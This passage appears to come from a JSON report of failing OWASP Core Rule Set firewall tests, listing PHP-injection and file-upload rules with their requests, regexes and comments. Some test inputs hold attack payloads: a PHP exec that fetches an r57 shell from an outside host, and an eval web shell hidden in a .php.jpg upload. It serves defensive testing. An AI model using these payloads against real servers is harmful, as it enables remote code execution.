\\\"\\^]*(?:k[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*l|l[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*t))|(?:c[\\\"\\^]*m[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u|f[\\\"\\^]*t)[\\\"\\^]*p|(?:(?:e[\\\"\\^]*l[\\\"\\^]*n[\\\"\\^]*e|i[\\\"\\^]*m[\\\"\\^]*e[\\\"\\^]*o[\\\"\\^]*u)[\\\"\\^]*|r[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*(?:p[\\\"\\^]*)?)t|l[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*n|p[\\\"\\^]*m[\\\"\\^]*(?:t[\\\"\\^]*o[\\\"\\^]*o[\\\"\\^]*l|v[\\\"\\^]*s[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r)|s[\\\"\\^]*(?:(?:d[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*)?c[\\\"\\^]*o[\\\"\\^]*n|e[\\\"\\^]*c[\\\"\\^]*i[\\\"\\^]*m[\\\"\\^]*p|k[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*l|p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*f)|y[\\\"\\^]*p[\\\"\\^]*e[\\\"\\^]*p[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*f|z[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l)|u[\\\"\\^]*n[\\\"\\^]*(?:e[\\\"\\^]*x[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*s[\\\"\\^]*e|i[\\\"\\^]*q[\\\"\\^]*u[\\\"\\^]*e[\\\"\\^]*i[\\\"\\^]*d|l[\\\"\\^]*o[\\\"\\^]*d[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r)|v[\\\"\\^]*s[\\\"\\^]*s[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|w[\\\"\\^]*(?:a[\\\"\\^]*i[\\\"\\^]*t[\\\"\\^]*f[\\\"\\^]*o[\\\"\\^]*r|b[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|(?:d[\\\"\\^]*s|e[\\\"\\^]*(?:c|v[\\\"\\^]*t))[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|h[\\\"\\^]*o[\\\"\\^]*a[\\\"\\^]*m[\\\"\\^]*i|i[\\\"\\^]*n[\\\"\\^]*(?:n[\\\"\\^]*t(?:[\\\"\\^]*3[\\\"\\^]*2)?|r[\\\"\\^]*s)|m[\\\"\\^]*i[\\\"\\^]*c|s[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*p[\\\"\\^]*t)|x[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*y)(?:\\.[\\\"\\^]*[0-9A-Z_a-z]+)?\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932380
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows Command Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "933100",
    "test_id" : 1,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933100.yaml",
    "description" : "PHP Injection Attack (933100) from old modsec regressions",
    "cause" : "failed expect_id check: 933100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "PHP Injection Attack (933100) from old modsec regressions",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Host" : "localhost",
            "Keep-Alive" : "300",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=<?exec('wget%20http://r57.biz/r57.txt%20-O",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 933100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 933100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ PHP Open Tag Found ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Detects PHP open tags \"<?\" and \"<?php\"."
        }, {
          "type" : "Comment",
          "text" : " http://www.php.net/manual/en/language.basic-syntax.phptags.php"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Care is taken to avoid false positives in XML declarations \"<?xml...\""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Also detects \"[php]\", \"[/php]\" and \"[\\php]\" tags used by some applications"
        }, {
          "type" : "Comment",
          "text" : " to indicate PHP dynamic content."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Previously, this rule also checked for the PHP close tag '?>', but"
        }, {
          "type" : "Comment",
          "text" : " this resulted in false positives which were difficult to prevent."
        }, {
          "type" : "Comment",
          "text" : " Therefore, that pattern is now checked by rule 933190 in paranoia levels"
        }, {
          "type" : "Comment",
          "text" : " 3 or higher."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)<\\?(?:[^x]|x(?:[^m]|m(?:[^l]|l(?:[^\\s\\x0b]|[\\s\\x0b]+[^a-z]|$)))|$|php)|\\[[/\\x5c]?php\\]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 933100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "PHP Injection Attack: PHP Open Tag Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-PHP"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.php_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "933110",
    "test_id" : 28,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933110.yaml",
    "description" : "PHP upload via multipart",
    "cause" : "failed expect_id check: 933110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 28,
      "desc" : "PHP upload via multipart",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Content-Type" : "multipart/form-data; boundary=--------397236876"
          },
          "uri" : "/post",
          "data" : "----------397236876\nContent-Disposition: form-data; name=\"fileRap\"; filename=\"something/dangerous.php\"\nContent-Type: text/plain\n\nplease block me\n----------397236876--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 933110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 933110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ PHP Script Uploads ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Block file uploads with filenames ending in PHP related extensions"
        }, {
          "type" : "Comment",
          "text" : " (.php, .phps, .phtml, .php5 etc)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Many application contain Unrestricted File Upload vulnerabilities."
        }, {
          "type" : "Comment",
          "text" : " https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Attackers may use such a vulnerability to achieve remote code execution"
        }, {
          "type" : "Comment",
          "text" : " by uploading a .php file. If the upload storage location is predictable"
        }, {
          "type" : "Comment",
          "text" : " and not adequately protected, the attacker may then request the uploaded"
        }, {
          "type" : "Comment",
          "text" : " .php file and have the code within it executed on the server."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Also block files with just dot (.) characters after the extension:"
        }, {
          "type" : "Comment",
          "text" : " https://www.rapid7.com/blog/post/2013/08/15/time-to-patch-joomla/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Some AJAX uploaders use the nonstandard request headers X-Filename,"
        }, {
          "type" : "Comment",
          "text" : " X_Filename, or X-File-Name to transmit the file name to the server;"
        }, {
          "type" : "Comment",
          "text" : " scan these request headers as well as multipart/form-data file names."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "FILES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X-Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X_Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X.Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X-File-Name"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : ".*\\.ph(?:p\\d*|tml|ar|ps|t|pt)\\.*$"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 933110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "PHP Injection Attack: PHP Script File Upload Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-PHP"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.php_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "933110",
    "test_id" : 29,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933110.yaml",
    "description" : "PHP upload via multipart should pass",
    "cause" : "failed no_expect_ids check: 933110 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=933110 - PHP Injection Attack: PHP Script File Upload Found" ]
    },
    "test" : {
      "test_id" : 29,
      "desc" : "PHP upload via multipart should pass",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Content-Type" : "multipart/form-data; boundary=--------397236876"
          },
          "uri" : "/post",
          "data" : "----------397236876\nContent-Disposition: form-data; name=\"something/dangerous.php\"; filename=\"safe.txt\"\nContent-Type: text/plain\n\nplease don't block me\n----------397236876--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 933110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 933110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ PHP Script Uploads ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Block file uploads with filenames ending in PHP related extensions"
        }, {
          "type" : "Comment",
          "text" : " (.php, .phps, .phtml, .php5 etc)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Many application contain Unrestricted File Upload vulnerabilities."
        }, {
          "type" : "Comment",
          "text" : " https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Attackers may use such a vulnerability to achieve remote code execution"
        }, {
          "type" : "Comment",
          "text" : " by uploading a .php file. If the upload storage location is predictable"
        }, {
          "type" : "Comment",
          "text" : " and not adequately protected, the attacker may then request the uploaded"
        }, {
          "type" : "Comment",
          "text" : " .php file and have the code within it executed on the server."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Also block files with just dot (.) characters after the extension:"
        }, {
          "type" : "Comment",
          "text" : " https://www.rapid7.com/blog/post/2013/08/15/time-to-patch-joomla/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Some AJAX uploaders use the nonstandard request headers X-Filename,"
        }, {
          "type" : "Comment",
          "text" : " X_Filename, or X-File-Name to transmit the file name to the server;"
        }, {
          "type" : "Comment",
          "text" : " scan these request headers as well as multipart/form-data file names."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "FILES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X-Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X_Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X.Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X-File-Name"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : ".*\\.ph(?:p\\d*|tml|ar|ps|t|pt)\\.*$"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 933110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "PHP Injection Attack: PHP Script File Upload Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-PHP"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.php_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "933111",
    "test_id" : 1,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933111.yaml",
    "description" : "PHP Injection Attack: PHP Script File Upload Found",
    "cause" : "failed expect_id check: 933111 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "PHP Injection Attack: PHP Script File Upload Found",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundaryoRWIb3busvBrbttO",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "uri" : "/post",
          "port" : 80,
          "data" : "------WebKitFormBoundaryoRWIb3busvBrbttO\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php.jpg\"\nContent-Type: image/jpeg\n\n<?php @eval($_POST[\"hacker\"]); ?>\n\n------WebKitFormBoundaryoRWIb3busvBrbttO--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 933111 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 933111,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ PHP Script Uploads: Superfluous extension ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Block file uploads with PHP related extensions (.php, .phps, .phtml,"
        }, {
          "type" : "Comment",
          "text" : " .php5 etc) anywhere in the name, followed by a dot."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Example: index.php.tmp"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Uploading of such files can lead to remote code execution if"
        }, {
          "type" : "Comment",
          "text" : " Apache is configured with AddType and MultiViews, as Apache will"
        }, {
          "type" : "Comment",
          "text" : " automatically do a filename match when the extension is unknown."
        }, {
          "type" : "Comment",
          "text" : " This configuration is fortunately not common in modern installs."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Blocking these file names might lead to more false positives."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Some AJAX uploaders use the nonstandard request headers X-Filename,"
        }, {
          "type" : "Comment",
          "text" : " X_Filename, or X-File-Name to transmit the file name to the server;"
        }, {
          "type" : "Comment",
          "text" : " scan these request headers as well as multipart/form-data file names."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is a stricter sibling of rule 933110."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "FILES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X-Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X_Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X.Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X-File-Name"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : ".*\\.(?:php\\d*|phtml)\\..*$"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 933111
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "PHP Injection Attack: PHP Script File Upload Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-PHP"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.php_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "933120",
    "test_id" : 2,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933120.yaml",
    "description" : "Test correct logging",
    "cause" : "nothing checked for test 2",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=1 rule_id=920510 - Invalid Cache-Control request header", "phase=2 rule_id=933120 - PHP Injection Attack: Configuration Directive Found" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test correct logging",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "Cache-Control" : "no-cache, no-store, must-revalidate",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "uri" : "/post",
          "port" : 80,
          "data" : "var=session.referer_check%3dtrue",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "match_regex" : "session.referer_check=t found within ARGS:var:"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 933120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ PHP Configuration Directives ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/933120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 933120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
